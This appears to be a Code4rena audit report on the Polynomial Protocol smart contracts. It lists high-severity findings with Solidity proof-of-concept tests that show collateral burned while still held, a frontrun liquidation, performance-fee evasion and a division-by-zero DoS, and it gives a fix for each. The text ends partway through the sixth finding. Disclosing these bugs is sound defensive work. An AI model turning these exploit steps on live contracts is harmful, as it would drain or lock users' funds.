---
sponsor: "Polynomial Protocol"
slug: "2023-03-polynomial"
date: "2023-08-01"
title: "Polynomial Protocol contest"
findings: "https://github.com/code-423n4/2023-03-polynomial-findings/issues"
contest: 222
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Polynomial Protocol smart contract system written in Solidity. The audit took place between March 13—March 20 2023.

## Wardens

36 Wardens contributed reports to the Polynomial Protocol audit:

  1. [0x52](https://twitter.com/IAm0x52)
  2. 0xRobocop
  3. [0xSmartContract](https://twitter.com/0xSmartContract)
  4. 0xbepresent
  5. Bauer
  6. [CRYP70](https://twitter.com/CRYP70_)
  7. [DadeKuma](https://twitter.com/DadeKuma)
  8. Diana
  9. [GalloDaSballo](https://twitter.com/gallodasballo)
  10. Josiah
  11. [KIntern\_NA](https://twitter.com/Trungore) ([TrungOre](https://twitter.com/Trungore) and duc)
  12. Lirios
  13. [MiloTruck](https://milotruck.github.io/)
  14. [Nyx](https://twitter.com/Nyksx__)
  15. PaludoX0
  16. RaymondFam
  17. [Rolezn](https://twitter.com/Rolezn)
  18. [Sathish9098](https://www.linkedin.com/in/sathishkumar-p-26069915a)
  19. \_\_141345\_\_
  20. [adriro](https://twitter.com/adrianromero)
  21. [auditor0517](https://twitter.com/auditor0517)
  22. [bin2chen](https://twitter.com/bin2chen)
  23. btk
  24. [bytes032](https://twitter.com/bytes032)
  25. [carlitox477](https://twitter.com/carlitox477)
  26. chaduke
  27. [csanuragjain](https://twitter.com/csanuragjain)
  28. [joestakey](https://twitter.com/JoeStakey)
  29. [juancito](https://twitter.com/0xJuancito)
  30. [kaden](https://twitter.com/0xKaden)
  31. [peakbolt](https://twitter.com/peak_bolt)
  32. peanuts
  33. rbserver
  34. sakshamguruji
  35. [sorrynotsorry](https://twitter.com/0xSorryNotSorry)

This audit was judged by [Dravee](https://twitter.com/BowTiedDravee).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 33 unique vulnerabilities. Of these vulnerabilities, 14 received a risk rating in the category of HIGH severity and 19 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 14 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the C4 Polynomial Protocol audit repository, and is composed of 12 smart contracts written in the Solidity programming language and includes 1849 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (14)
## [[H-01] `Exchange._liquidate` function can cause liquidator to burn too much `powerPerp` tokens](https://github.com/code-423n4/2023-03-polynomial-findings/issues/226)
*Submitted by [rbserver](https://github.com/code-423n4/2023-03-polynomial-findings/issues/226)*

When calling the following `Exchange._liquidate` function, `uint256 totalCollateralReturned = shortCollateral.liquidate(positionId, debtRepaying, msg.sender)` is executed.

```solidity
    function _liquidate(uint256 positionId, uint256 debtRepaying) internal {
        uint256 maxDebtRepayment = shortCollateral.maxLiquidatableDebt(positionId);
        require(maxDebtRepayment > 0);
        if (debtRepaying > maxDebtRepayment) debtRepaying = maxDebtRepayment;

        IShortToken.ShortPosition memory position = shortToken.shortPositions(positionId);

        uint256 totalCollateralReturned = shortCollateral.liquidate(positionId, debtRepaying, msg.sender);

        address user = shortToken.ownerOf(positionId);

        uint256 finalPosition = position.shortAmount - debtRepaying;
        uint256 finalCollateralAmount = position.collateralAmount - totalCollateralReturned;

        shortToken.adjustPosition(positionId, user, position.collateral, finalPosition, finalCollateralAmount);

        pool.liquidate(debtRepaying);
        powerPerp.burn(msg.sender, debtRepaying);
        ...
    }
```

In the following `ShortCollateral.liquidate` function, when executing `uint256 collateralClaim = debt.mulDivDown(markPrice, collateralPrice)`, where `debt` is `debtRepaying`, `collateralClaim` can be high if `collateralPrice` has become much lower comparing to `markPrice`, such as due to a market sell-off that causes the collateral to be worth much less than before. In this case, `totalCollateralReturned` can be high as well, which can cause `totalCollateralReturned > userCollateral.amount` to be true. When such condition is true, `totalCollateralReturned = userCollateral.amount` is executed, and only `userCollateral.amount` is transferred to the liquidator after executing `ERC20(userCollateral.collateral).safeTransfer(user, totalCollateralReturned)`.

```solidity
    function liquidate(uint256 positionId, uint256 debt, address user)
        external
        override
        onlyExchange
        nonReentrant
        returns (uint256 totalCollateralReturned)
    {
        UserCollateral storage userCollateral = userCollaterals[positionId];

        bytes32 currencyKey = synthetixAdapter.getCurrencyKey(userCollateral.collateral);
        Collateral memory coll = collaterals[currencyKey];

        (uint256 markPrice,) = exchange.getMarkPrice();
        (uint256 collateralPrice,) = synthetixAdapter.getAssetPrice(currencyKey);
        uint256 collateralClaim = debt.mulDivDown(markPrice, collateralPrice);
        uint256 liqBonus = collateralClaim.mulWadDown(coll.liqBonus);
        totalCollateralReturned = liqBonus + collateralClaim;
        if (totalCollateralReturned > userCollateral.amount) totalCollateralReturned = userCollateral.amount;
        userCollateral.amount -= totalCollateralReturned;

        ERC20(userCollateral.collateral).safeTransfer(user, totalCollateralReturned);
        ...
    }
```

Back in the `Exchange._liquidate` function, the liquidator burns `debtRepaying` `powerPerp` tokens after `powerPerp.burn(msg.sender, debtRepaying)` is executed. However, in this situation, the liquidator only receives `userCollateral.amount` collateral tokens that are less than the collateral token amount that should be equivalent to `debtRepaying` `powerPerp` tokens but this liquidator still burns `debtRepaying` `powerPerp` tokens. As a result, this liquidator loses the extra `powerPerp` tokens, which are burnt, that are equivalent to the difference between `debtRepaying` `powerPerp` tokens' equivalent collateral token amount and `userCollateral.amount` collateral tokens.

### Proof of Concept

The following steps can occur for the described scenario.

1.  Alice calls the `Exchange._liquidate` function with `debtRepaying` being 1000e18.
2.  When the `ShortCollateral.liquidate` function is called, `totalCollateralReturned > userCollateral.amount` is true, and `userCollateral.amount` collateral tokens that are equivalent to 500e18 `powerPerp` tokens are transferred to Alice.
3.  When `powerPerp.burn(msg.sender, debtRepaying)` is executed in the `Exchange._liquidate` function, Alice burns 1000e18 `powerPerp` tokens.
4.  Because Alice only receives `userCollateral.amount` collateral tokens that are equivalent to 500e18 `powerPerp` tokens, she loses 500e18 `powerPerp` tokens.

### Tools Used

VSCode

### Recommended Mitigation Steps

The `Exchange._liquidate` function can be updated to burn the number of `powerPerp` tokens that are equivalent to the actual collateral token amount received by the liquidator instead of burning `debtRepaying` `powerPerp` tokens.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/226#issuecomment-1510105074)**

***

## [[H-02] Hedging during liquidation is incorrect](https://github.com/code-423n4/2023-03-polynomial-findings/issues/214)
*Submitted by [KIntern\_NA](https://github.com/code-423n4/2023-03-polynomial-findings/issues/214)*

Hedging will not work as expected, and LiquidityPool will lose funds without expectation.

### Proof of concept

1.  When a short position is liquidated in contract Exchange, function `_liquidate` will be triggered. It will burn the power perp tokens and reduce the short position amount accordingly.

```solidity
function _liquidate(uint256 positionId, uint256 debtRepaying) internal {
    ...
    uint256 finalPosition = position.shortAmount - debtRepaying;
    uint256 finalCollateralAmount = position.collateralAmount - totalCollateralReturned;
    
    shortToken.adjustPosition(positionId, user, position.collateral, finalPosition, finalCollateralAmount);

    pool.liquidate(debtRepaying);
    powerPerp.burn(msg.sender, debtRepaying); 
    ...
```

2.  As you can see, it will decrease the size of short position by  `debtRepaying`, and burn `debtRepaying` power perp tokens. Because of the same amount, the skew of `LiquidityPool` will not change.
3.  Howerver, `pool.liquidate` will be called, and `LiquidityPool` will be hedged with `debtRepaying` amount.

```solidity
function liquidate(uint256 amount) external override onlyExchange nonReentrant {
    (uint256 markPrice, bool isInvalid) = getMarkPrice();
    require(!isInvalid);

    uint256 hedgingFees = _hedge(int256(amount), true);
    usedFunds += int256(hedgingFees);

    emit Liquidate(markPrice, amount);
}
```

4.  Therefore, LiquidityPool will be hedged more than it needs, and the position of `LiquidityPool` in the Perp Market will be incorrect (compared with what it should be for hedging).

### Recommended Mitigation Steps

Should not hedge the LiquidityPool during liquidation.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/214#issuecomment-1494185661)**



***

## [[H-03] Short positions can be burned while holding collateral](https://github.com/code-423n4/2023-03-polynomial-findings/issues/206)
*Submitted by [MiloTruck](https://github.com/code-423n4/2023-03-polynomial-findings/issues/206), also found by [bin2chen](https://github.com/code-423n4/2023-03-polynomial-findings/issues/131), [chaduke](https://github.com/code-423n4/2023-03-polynomial-findings/issues/65), [0x52](https://github.com/code-423n4/2023-03-polynomial-findings/issues/43), [Bauer](https://github.com/code-423n4/2023-03-polynomial-findings/issues/29), and [0xRobocop](https://github.com/code-423n4/2023-03-polynomial-findings/issues/6)*

Users can permanently lose a portion of their collateral due to a malicious attacker or their own mistake.

### Vulnerability Details

In the `ShortToken` contract, `adjustPosition()` is used to handle changes to a short position's short or collateral amounts. The function also handles the burning of positions with the following logic:

```solidity
position.collateralAmount = collateralAmount;
position.shortAmount = shortAmount;

if (position.shortAmount == 0) {
    _burn(positionId);
}
```

Where:

*   `collateralAmount` - New amount of collateral in a position.
*   `shortAmount` - New short amount of a position.
*   `positionId` - ERC721 `ShortToken` of a short position.

As seen from above, if a position's `shortAmount` is set to 0, it will be burned. Furthermore, as the code does not ensure `collateralAmount` is not 0 before burning, it is possible to burn a position while it still has collateral.

If this occurs, the position's owner will lose all remaining collateral in the position. This remaining amount will forever be stuck in the position as its corresponding `ShortToken` no longer has an owner.

### Proof of Concept

In the `Exchange` contract, users can reduce a position's `shortAmount` using `closeTrade()` (`Exchange.sol#L100-L109`) and `liquidate()` (`Exchange.sol#L140-L148`). With these two functions, there are three realistic scenarios where a position with collateral could be burned.

**1. User reduces his position's `shortAmount` to 0**

A user might call `closeTrade()` on a short position with the following parameters:

*   `params.amount` - Set to the position's short amount.
*   `params.collateralAmount` - Set to any amount less than the position's total collateral amount.

This would reduce his position's `shortAmount` to 0 without withdrawing all of its collateral, causing him to lose the remaining amount.

Although this could be considered a user mistake, such a scenario could occur if a user does not want to hold a short position temporarily without fully withdrawing his collateral.

**2. Attacker fully liquidates a short position**

In certain situations, it is possible for a short position to have collateral remaining after a full liquidation (example in the coded PoC below). This collateral will be lost as full liquidations reduces a position's `shortAmount` to 0, thereby burning the position.

**3. Attacker frontruns a user's `closeTrade()` transaction with a liquidation**

Consider the following scenario:

*   Alice has an unhealthy short position that is under the liquidation ratio and can be fully liquidated.
*   To bring her position back above the liquidation ratio, Alice decides to partially reduce its short amount. She calls `closeTrade()` on her position with the following parameters:
    *   `params.amount` - Set to 40% of the position's short amount.
    *   `params.collateralAmount` - Set to 0.
*   A malicious attacker, Bob, sees her `closeTrade()` transaction in the mempool.
*   Bob frontruns the transaction, calling `liquidate()` with the following parameters:
    *   `positionId` - ID of Alice's position.
    *   `debtRepaying` - Set to 60% of Alice's position's short amount.
*   Bob's `liquidate()` transaction executes first, reducing the short amount of Alice's position to 40% of the original amount.
*   Alice's `closeTrade()` transaction executes, reducing her position's short amount by 40% of the original amount, thus its `shortAmount` becomes 0.

In the scenario above, Alice loses the remaining collateral in her short position as it is burned after `closeTrade()` executes.

Note that this attack is possible as long as an attacker can liquidate the position's remaining short amount. For example, if Alice calls `closeTrade()` with 70% of the position's short amount, Bob only has to liquidate 30% of its short amount.

**Coded PoC**

The code below contains three tests that demonstrates the scenarios above:

1.  `testCloseBurnsCollateral()`
2.  `testLiquidateBurnsCollateral()`
3.  `testAttackerFrontrunLiquidateBurnsCollateral()`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import {TestSystem, Exchange, ShortToken, ShortCollateral, MockERC20Fail} from "./utils/TestSystem.sol";

contract PositionWithCollateralBurned is TestSystem {
    // Protocol contracts
    Exchange private exchange;
    ShortToken private shortToken;
    ShortCollateral private shortCollateral;

    // sUSD token contract
    MockERC20Fail private SUSD;

    // Intial base asset price
    uint256 private constant initialBaseAssetPrice = 1e18;

    // Users
    address private USER = user_1;
    address private ATTACKER = user_2;

    function setUp() public {
        // Deploy contracts
        deployTestSystem();
        initPool();
        initExchange();
        preparePool();

        exchange = getExchange();
        shortToken = getShortToken();
        shortCollateral = getShortCollateral();
        SUSD = getSUSD();

        // Set initial price for base asset
        setAssetPrice(initialBaseAssetPrice);

        // Mint sUSD for USER
        SUSD.mint(USER, 1e20);

        // Mint powerPerp for ATTACKER
        vm.prank(address(exchange));
        getPowerPerp().mint(ATTACKER, 1e20);
    }

    function testCloseBurnsCollateral() public {
        // Open short position
        uint256 shortAmount = 1e18;
        uint256 collateralAmount = 1e15;
        uint256 positionId = openShort(shortAmount, collateralAmount, USER);

        // Fully close position without withdrawing any collateral
        closeShort(positionId, shortAmount, 0, USER);

        // positionId still holds 1e15 sUSD as collateral
        (,, uint256 remainingCollateralAmount, ) = shortToken.shortPositions(positionId);
        assertEq(remainingCollateralAmount, collateralAmount);

        // positionId is already burned (ie. ownerOf reverts with "NOT_MINTED")
        vm.expectRevert("NOT_MINTED");
        shortToken.ownerOf(positionId);
    }

    function testLiquidateBurnsCollateral() public {
        // USER opens short position with amount = 1e18, collateral amount = 1e15
        uint256 shortAmount = 1e18;
        uint256 positionId = openShort(1e18, 1e15, USER);

        // Base asset price rises by 35%
        setAssetPrice(initialBaseAssetPrice * 135 / 100);

        // USER's entire short position is liquidatable
        assertEq(shortCollateral.maxLiquidatableDebt(positionId), shortAmount);

        // ATTACKER liquidates USER's entire short position
        vm.prank(ATTACKER);
        exchange.liquidate(positionId, shortAmount);

        // positionId has no remaining debt, but still holds some collateral
        (, uint256 remainingAmount, uint256 remainingCollateralAmount, ) = shortToken.shortPositions(positionId);
        assertEq(remainingAmount, 0);
        assertGt(remainingCollateralAmount, 0);

        // positionId is already burned (ie. ownerOf reverts with "NOT_MINTED")
        vm.expectRevert("NOT_MINTED");
        shortToken.ownerOf(positionId);
    }

    function testAttackerFrontrunLiquidateBurnsCollateral() public {
        // USER opens short position with amount = 1e18, collateral amount = 1e15
        uint256 shortAmount = 1e18;
        uint256 positionId = openShort(1e18, 1e15, USER);

        // Base asset price rises by 40%
        setAssetPrice(initialBaseAssetPrice * 140 / 100);

        // USER's short position is liquidatable
        assertEq(shortCollateral.maxLiquidatableDebt(positionId), shortAmount);

        // ATTACKER frontruns USER's closeTrade() transaction, liquidating 60% of USER's amount
        vm.prank(ATTACKER);
        exchange.liquidate(positionId, shortAmount * 60 / 100);

        // USER's closeTrade() transaction executes, reducing shortAmount by the remaining 40%
        closeShort(positionId, shortAmount * 40 / 100, 0, USER);

        // positionId has no remaining debt, but still holds some collateral
        (, uint256 remainingAmount, uint256 remainingCollateralAmount, ) = shortToken.shortPositions(positionId);
        assertEq(remainingAmount, 0);
        assertGt(remainingCollateralAmount, 0);

        // positionId is already burned (ie. ownerOf reverts with "NOT_MINTED")
        vm.expectRevert("NOT_MINTED");
        shortToken.ownerOf(positionId);
    }

    function openShort(
        uint256 amount,
        uint256 collateralAmount,
        address user
    ) internal returns (uint256 positionId) {
        Exchange.TradeParams memory tradeParams;
        tradeParams.amount = amount;
        tradeParams.collateral = address(SUSD);
        tradeParams.collateralAmount = collateralAmount;

        vm.startPrank(user);
        SUSD.approve(address(exchange), collateralAmount);
        (positionId, ) = exchange.openTrade(tradeParams);
        vm.stopPrank();
    }

    function closeShort(
        uint256 positionId,
        uint256 amount,
        uint256 collateralAmount,
        address user
    ) internal {
        Exchange.TradeParams memory tradeParams;
        tradeParams.amount = amount;
        tradeParams.collateral = address(SUSD);
        tradeParams.collateralAmount = collateralAmount;
        tradeParams.maxCost = 100e18;
        tradeParams.positionId = positionId;

        vm.startPrank(user);
        SUSD.approve(address(getPool()), tradeParams.maxCost);
        exchange.closeTrade(tradeParams);
        vm.stopPrank();
    }
}
```

### Recommended Mitigation

Ensure that positions cannot be burned if they have any collateral:

```diff
-            if (position.shortAmount == 0) {
+            if (position.shortAmount == 0 && position.collateralAmount == 0) {
                 _burn(positionId);
             }
```

**[mubaris (Polynomial) confirmed via duplicate issue `#65`](https://github.com/code-423n4/2023-03-polynomial-findings/issues/65#issuecomment-1496079042)**

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/206#issuecomment-1540495366):**
 > The 3rd scenario isn't likely due to frontrunning not being an issue on Optimism.<br>
> This report still brings the most value and is the most well presented.



***

## [[H-04] `KangarooVault.removeCollateral` updates storage without actually removing collateral, resulting in lost collateral](https://github.com/code-423n4/2023-03-polynomial-findings/issues/189)
*Submitted by [joestakey](https://github.com/code-423n4/2023-03-polynomial-findings/issues/189), also found by [juancito](https://github.com/code-423n4/2023-03-polynomial-findings/issues/261), [auditor0517](https://github.com/code-423n4/2023-03-polynomial-findings/issues/205), [bin2chen](https://github.com/code-423n4/2023-03-polynomial-findings/issues/133), [KIntern\_NA](https://github.com/code-423n4/2023-03-polynomial-findings/issues/111), [chaduke](https://github.com/code-423n4/2023-03-polynomial-findings/issues/89), [Bauer](https://github.com/code-423n4/2023-03-polynomial-findings/issues/30), and [0x52](https://github.com/code-423n4/2023-03-polynomial-findings/issues/19)*

The admin can call `KangarooVault.addCollateral` to add additional collateral to a Power Perp position.

```solidity
File: src/KangarooVault.sol
424:     function addCollateral(uint256 additionalCollateral) external requiresAuth nonReentrant {
425:         SUSD.safeApprove(address(EXCHANGE), additionalCollateral);
426:         EXCHANGE.addCollateral(positionData.positionId, additionalCollateral);
427: 
428:         usedFunds += additionalCollateral;
429:         positionData.totalCollateral += additionalCollateral;
430: 
431:         emit AddCollateral(positionData.positionId, additionalCollateral);
432:     }
```

This transfers `SUSD` to the `EXCHANGE` and updates the `usedFunds` and `positionData.totalCollateral`

The function `KangarooVault.removeCollateral` allows the admin to remove collateral if a position is healthy enough.

```solidity
File: src/KangarooVault.sol
436:     function removeCollateral(uint256 collateralToRemove) external requiresAuth nonReentrant {
437:         (uint256 markPrice,) = LIQUIDITY_POOL.getMarkPrice();
438:     uint256 minColl = positionData.shortAmount.mulWadDown(markPrice);
439:         minColl = minColl.mulWadDown(collRatio);
440: 
441:         require(positionData.totalCollateral >= minColl + collateralToRemove);
442:         
443:         usedFunds -= collateralToRemove;
444:         positionData.totalCollateral -= collateralToRemove;
445: 
446:         emit RemoveCollateral(positionData.positionId, collateralToRemove);
447:     }    
```

The issue is that this function does not call `EXCHANGE.removeCollateral`.<br>
While it updates storage, it does not actually retrieve any collateral.

### Impact

2 problems arising:

*   `processWithdrawalQueue` will revert unexpectedly, as `usedFunds` will be lower than it should, leading to `availableFunds` being greater than the real balance of `SUSD` available (`KangarooVault.sol#L279`).
*   the main problem: the amount of collateral "removed" in `removeCollateral` will be lost :

When closing a position in `KangarooVault._closePosition`, the amount of collateral to retrieve is written in `tradeParams.collateralAmount`. As you can see below, it is capped by `positionData.totalCollateral`, which was decremented in `removeCollateral`.

```solidity
File: src/KangarooVault.sol
687:         if (amt >= positionData.shortAmount) {
688:             longPositionToClose = positionData.longPerp;
689: 
690:             tradeParams.amount = positionData.shortAmount;
691:             tradeParams.collateralAmount = positionData.totalCollateral; //@audit here
692:         } else {
693:             longPositionToClose = amt.mulDivDown(positionData.longPerp, positionData.shortAmount);
694:             uint256 collateralToRemove = amt.mulDivDown(positionData.totalCollateral, positionData.shortAmount);
695: 
696:             tradeParams.amount = amt;
697:             tradeParams.collateralAmount = collateralToRemove;
698:         }
699: 
700:         SUSD.safeApprove(address(LIQUIDITY_POOL), maxCost);
701:         uint256 totalCost = EXCHANGE.closeTrade(tradeParams);
```

This is the amount of collateral that will be transferred back to the trader (here the `KangarooVault`)

```solidity
src/Exchange.sol _closeTrade()
316: shortCollateral.sendCollateral(params.positionId, params.collateralAmount);
```

```solidity
File: src/ShortCollateral.sol
106:     function sendCollateral(uint256 positionId, uint256 amount) external override onlyExchange nonReentrant {
107:         UserCollateral storage userCollateral = userCollaterals[positionId];
108: 
109:         userCollateral.amount -= amount;
110: 
111:         address user = shortToken.ownerOf(positionId);
112: 
113:         ERC20(userCollateral.collateral).safeTransfer(user, amount); //@audit capped by `positionData.totalCollateral`
```

In conclusion, calling `removeCollateral` will result in that amount being lost.

### Proof of Concept

Amend this test to `KangarooVault.t.sol`, which shows how collateral is not transferred upon calling `removeCollateral()`.

```diff
429:     function testCollateralManagement() public {
430:         uint256 amt = 1e18;
431:         uint256 collDelta = 1000e18;
432: 
433:         kangaroo.openPosition(amt, 0);
434:         skip(100);
435:         kangaroo.executePerpOrders(emptyData);
436:         kangaroo.clearPendingOpenOrders(0);
437: 
438:         (,,,,,,, uint256 initialColl,) = kangaroo.positionData();
+439:         uint256 balanceBefore = susd.balanceOf(address(kangaroo));
440: 
441:         kangaroo.addCollateral(collDelta);
+442:         uint256 balanceAfter = susd.balanceOf(address(kangaroo));
+443:         assertEq(collDelta, balanceBefore - balanceAfter);
444:         (,,,,,,, uint256 finalColl,) = kangaroo.positionData();
445: 
446:         assertEq(finalColl, initialColl + collDelta);
447: 
+448:         uint256 balanceBefore2 = susd.balanceOf(address(kangaroo));
449:         kangaroo.removeCollateral(collDelta);
+450:         uint256 balanceAfter2 = susd.balanceOf(address(kangaroo));
+451:         assertEq(0, balanceAfter2 - balanceBefore2); //@audit collateral not removed
452: 
453:         (,,,,,,, uint256 newColl,) = kangaroo.positionData();
454: 
455:         assertEq(newColl, initialColl);
456:     }

```

### Tools Used

Manual Analysis, Foundry

### Recommended Mitigation

Ensure `Exchange.removeCollateral` is called:

```diff
File: src/KangarooVault.sol
436:     function removeCollateral(uint256 collateralToRemove) external requiresAuth nonReentrant {
437:         (uint256 markPrice,) = LIQUIDITY_POOL.getMarkPrice();
438:         uint256 minColl = positionData.shortAmount.mulWadDown(markPrice);
439:         minColl = minColl.mulWadDown(collRatio);
440: 
441:         require(positionData.totalCollateral >= minColl + collateralToRemove);
442:         
443:         usedFunds -= collateralToRemove;
444:         positionData.totalCollateral -= collateralToRemove;
445: 
+            EXCHANGE.removeCollateral(positionData.positionId, collateralToRemove)
446:         emit RemoveCollateral(positionData.positionId, collateralToRemove);
447:     }    
```

**[mubaris (Polynomial) confirmed via duplicate issue `#111`](https://github.com/code-423n4/2023-03-polynomial-findings/issues/111#issuecomment-1493876338)**

**[Dravee (judge) increased severity to High](https://github.com/code-423n4/2023-03-polynomial-findings/issues/189#issuecomment-1532268430)**



***

## [[H-05] Uneven deduction of performance fee causes some KangarooVault users to lose part of their token value](https://github.com/code-423n4/2023-03-polynomial-findings/issues/161)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-03-polynomial-findings/issues/161)*

In `KangarooVault._resetTrade()`, a `performanceFee` is charged upon closing of all positions, on the `premiumCollected`. This is inconsistent with `getTokenPrice()` as `premiumCollected` is factored in the token price computation, while the `performanceFee` is not. This leads to an uneven distribution of the `performanceFee` for the `KangarooVault` users.

### Impact

That means a user can evade the `performanceFee` and steal some of the funds from the rest by triggering `processWithdraw()` before the `performanceFee` is deducted from `KangarooVault`. The remaining users will be shortchanged and lose part of their token value as they bear the charges from the performance fee.

**Detailed Explanation**

When all positions in `KangarooVault` are closed, `_resetTrade()` is triggered, which will proceed to deduct a `performanceFee` from the `premiumCollected`.

    function _resetTrade() internal {
        positionData.positionId = 0;
        (uint256 totalMargin,) = PERP_MARKET.remainingMargin(address(this));
        PERP_MARKET.transferMargin(-int256(totalMargin));
        usedFunds -= totalMargin;

        uint256 fees = positionData.premiumCollected.mulWadDown(performanceFee);
        if (fees > 0) SUSD.safeTransfer(feeReceipient, fees);

        totalFunds += positionData.premiumCollected - fees;
        totalFunds -= usedFunds;

        positionData.premiumCollected = 0;
        positionData.totalMargin = 0;
        usedFunds = 0;
    }

`KangarooVault.sol#L788-L789`

However, only `premiumCollected` is factored in the `getTokenPrice()` computation but not the `performanceFee`. That means the premiums are distributed among the users via token price, while the performance fee is not.

    function getTokenPrice() public view returns (uint256) {
        if (totalFunds == 0) {
            return 1e18;
        }

        uint256 totalSupply = getTotalSupply();
        if (positionData.positionId == 0) {
            return totalFunds.divWadDown(totalSupply);
        }

        uint256 totalMargin;

        (uint256 markPrice, bool isInvalid) = EXCHANGE.getMarkPrice();
        require(!isInvalid);
        (totalMargin, isInvalid) = PERP_MARKET.remainingMargin(address(this));
        require(!isInvalid);

        uint256 totalValue = totalFunds + positionData.premiumCollected + totalMargin + positionData.totalCollateral;
        totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount));

        return totalValue.divWadDown(totalSupply);
    }

`KangarooVault.sol#L358-L359`

### Proof of Concept

Add the following imports and test case to `test/KangarooVault.t.sol`

    import {IVaultToken} from "../src/interfaces/IVaultToken.sol";

    function testKangarooPerformanceFee() public {
        uint256 amt = 231e18;
        IVaultToken vaultToken = IVaultToken(kangaroo.VAULT_TOKEN());

        // deposit equal value for both user_2 and user 3 into KangarooVault
        uint256 depositAmt = 10e18;
        susd.mint(user_2, depositAmt);
        vm.startPrank(user_2);
        susd.approve(address(kangaroo), depositAmt);
        kangaroo.initiateDeposit(user_2, depositAmt);
        assertEq((vaultToken.balanceOf(user_2) * kangaroo.getTokenPrice())/1e18, depositAmt);
        vm.stopPrank();

        susd.mint(user_3, depositAmt);
        vm.startPrank(user_3);
        susd.approve(address(kangaroo), depositAmt);
        kangaroo.initiateDeposit(user_3, depositAmt);
        assertEq((vaultToken.balanceOf(user_2) * kangaroo.getTokenPrice())/1e18, depositAmt);
        vm.stopPrank();

        skip(14500);
        kangaroo.processDepositQueue(2);


        // Open position at KangarooVault and execute the orders
        kangaroo.openPosition(amt, 0);
        skip(100);
        kangaroo.executePerpOrders(emptyData);
        kangaroo.clearPendingOpenOrders(0);

        // Simulate price drop to trigger profit from premium collection
        setAssetPrice(initialPrice - 100e18);

        // initiate withdrawal for both user_2 and user_3
        vm.prank(user_2);
        kangaroo.initiateWithdrawal(user_2, depositAmt);

        vm.prank(user_3);
        kangaroo.initiateWithdrawal(user_3, depositAmt);

        skip(14500);

        // close all position with gain from premium collection
        kangaroo.closePosition(amt, 1000000e18);
        skip(100);
        kangaroo.executePerpOrders(emptyData);


        // user_2 frontrun clearPendingCloseOrders() to withdraw at higher token price
        kangaroo.processWithdrawalQueue(1);
        assertEq(vaultToken.balanceOf(user_2), 0);
        assertEq(susd.balanceOf(user_2), 9693821343146274141);

        // This will trigger resetTrade and deduct performance Fee
        kangaroo.clearPendingCloseOrders(0);

        // user_3's withdrawal was processed but at a lower token price
        kangaroo.processWithdrawalQueue(1);
        assertEq(vaultToken.balanceOf(user_3), 0);
        assertEq(susd.balanceOf(user_3),9655768088211372841);

        // This shows that user_3 was shortchanged and lost part of token value, 
        // despite starting with equal token balance
        assertGt(susd.balanceOf(user_2), susd.balanceOf(user_3));
    }

### Recommended Mitigation Steps

Consider changing the following in `KangarooVault.sol#L359`

        totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount) );

to

        totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount) + positionData.premiumCollected.mulWadDown(performanceFee));

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/161#issuecomment-1495909266)**



***

## [[H-06] Division by zero error causes KangarooVault to be DoS with funds locked inside](https://github.com/code-423n4/2023-03-polynomial-findings/issues/160)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-03-polynomial-findings/issues/160)*

`KangarooVault` can be DoS with funds locked in the contract due to a division by zero error in `getTokenPrice()` as it does not handle the scenario where `getTotalSupply()` is zero.

### Impact

Funds will be locked within the `KangarooVault` (as shown in the PoC below) and it is not able to recover from the DoS.

That is because, to recover from the DoS, it requires increasing total supply through minting of new tokens via deposits. However, that is not possible as `initiateDeposit()` relies on `getTokenPrice()`.

Also, we cannot withdraw the remaining funds as there are no more `VaultTokens` left to burn.

**Detailed Explanation**

`getTokenPrice()` will attempt to perform a division by `getTotalSupply()` when `totalFunds != 0` and `positionId == 0`. This scenario is possible when there are remaining funds in `KangarooVault` when all positions are closed and all vault token holders withdrawn their funds.

    function getTokenPrice() public view returns (uint256) {
        if (totalFunds == 0) {
            return 1e18;
        }

        uint256 totalSupply = getTotalSupply();
        if (positionData.positionId == 0) {
            return totalFunds.divWadDown(totalSupply);
        }

### Proof of Concept

Add the following imports and test case to `test/Kangaroo.Vault.t.sol`

    function testKangarooDivisionByZero() public {
        uint256 amt = 231e18;

        // Open position to decrease availableFunds for withdrawals.
        kangaroo.openPosition(amt, 0);
        skip(100);
        kangaroo.executePerpOrders(emptyData);
        kangaroo.clearPendingOpenOrders(0);

        // initiate user withdrawal
        // this will be a partial withdrawal due to the open position.
        vm.prank(user_1);
        kangaroo.initiateWithdrawal(user_1, 5e23);
        kangaroo.processWithdrawalQueue(1);

        // close all position
        kangaroo.closePosition(amt, 1000000e18);
        skip(100);
        kangaroo.executePerpOrders(emptyData);
        kangaroo.clearPendingCloseOrders(0);

        // Complete remaining withdrawals of funds.
        // this will reduce totalSupply to zero and later cause a division by zero error.
        kangaroo.processWithdrawalQueue(1);

        /// prepare for new deposit
        vm.startPrank(user_1);
        susd.approve(address(kangaroo), 5e23);

        // This deposit will revert due to division by zero.
        vm.expectRevert();
        kangaroo.initiateDeposit(user_1, 5e23);
        vm.stopPrank();

        // KangarooVault is now DoS and some funds are locked in it
